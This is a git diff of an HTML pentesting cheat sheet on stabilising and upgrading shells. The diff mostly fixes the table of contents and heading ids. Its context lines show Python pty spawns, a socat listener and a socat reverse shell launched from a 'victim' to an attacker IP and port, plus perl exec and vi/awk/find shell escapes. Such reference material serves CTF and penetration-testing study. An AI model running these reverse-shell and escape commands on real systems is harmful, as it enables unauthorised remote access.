@@ -183,31 +183,24 @@
   <h2>Table of Contents</h2>
         <aside class="table-of-contents"><nav id="TableOfContents">
   <ul>
-    <li><a href="#Description">Description</a></li>
-    <li><a href="#Nmap-Scan">Nmap Scan</a></li>
+    <li><a href="#Pythonptymodule">Python pty module</a></li>
+    <li><a href="#Usingsocat">Using socat</a></li>
       <ul>
-        <li><a href="#Output">Output</a></li>        
+        <li><a href="#OnKali(listen)">On Kali (listen)</a></li>
+        <li><a href="#OnVictim(launch)">On Victim (launch)</a></li>        
+        <li><a href="#IfnotdownloadinVictim">If not download in Victim:</a></li>        
       </ul>
-    <li><a href="#IP">Open the IP in browser</a></li>
-    <li><a href="#ftp">Login Anonymously Using FTP</a></li>
-    <li><a href="#Wireshark">Open the downloaded file in Wireshark</a></li>
-    <li><a href="#browser">Open the found path in browser</a></li>
-    <li><a href="#path">We got path for Username and Password’s file</a></li>
-      <ul>
-        <li><a href="#usernames">We got usernames</a></li> 
-        <li><a href="#password">We got password</a></li>       
-      </ul>
-    <li><a href="#hydra">Use hydra to get the correct Username and Password</a></li>
-    <li><a href="#ssh">Use SSH to connect</a></li> 
+    <li><a href="#Otherways">Other ways</a></li>
+    <li><a href="#RelatedShellEscapeSequences">Related Shell Escape Sequences</a></li>
     <ul>
-        <li><a href="#exploits">Look for the Kernel exploits</a></li> 
-    </ul> 
-    <li><a href="#flag">Grab your flag..!</a></li>
-  </ul>
+        <li><a href="#Vi-Vim">Vi / Vim</a></li>
+        <li><a href="#awk">awk</a></li>        
+        <li><a href="#find">find</a></li>        
+    </ul>  
 </nav></aside>     
 
 <br/>
-<h2 id="Python pty module">Python pty module:</h2>     
+<h2 id="Pythonptymodule">Python pty module:</h2>     
 <pre>
   <code>
 python -c 'import pty; pty.spawn("/bin/sh")'<br/>
@@ -217,8 +210,8 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 </pre>
 
 <br/>
-<h2 id="Using socat">Using socat:</h2>
-<h3 id="On Kali (listen)">On Kali (listen):</h3>
+<h2 id="Usingsocat">Using socat:</h2>
+<h3 id="OnKali(listen)">On Kali (listen):</h3>
 
 <pre>
   <code>
@@ -228,7 +221,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 <br/>
 
-<h3 id="On Victim (launch)">On Victim (launch):</h3>
+<h3 id="OnVictim(launch)">On Victim (launch):</h3>
 
 <pre>
   <code>
@@ -238,7 +231,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 <br/>
 
-<h3 id="If not download in Victim">If not download in Victim:</h3>
+<h3 id="IfnotdownloadinVictim">If not download in Victim:</h3>
 
 <pre>
   <code>
@@ -247,7 +240,7 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 
 <br/>
 
-<h2 id="Other ways">Other ways:</h2>
+<h2 id="Otherways">Other ways:</h2>
 
 <pre>
   <code>
@@ -273,8 +266,8 @@ perl -e 'exec "/bin/sh";'<br/>
 
 <br/>
 
-<h2 id="Related Shell Escape Sequences">Related Shell Escape Sequences:</h2>
-<h3 id="Vi / Vim">Vi / Vim</h3>
+<h2 id="RelatedShellEscapeSequences">Related Shell Escape Sequences:</h2>
+<h3 id="Vi-Vim">Vi / Vim</h3>
 
 <pre>
   <code>
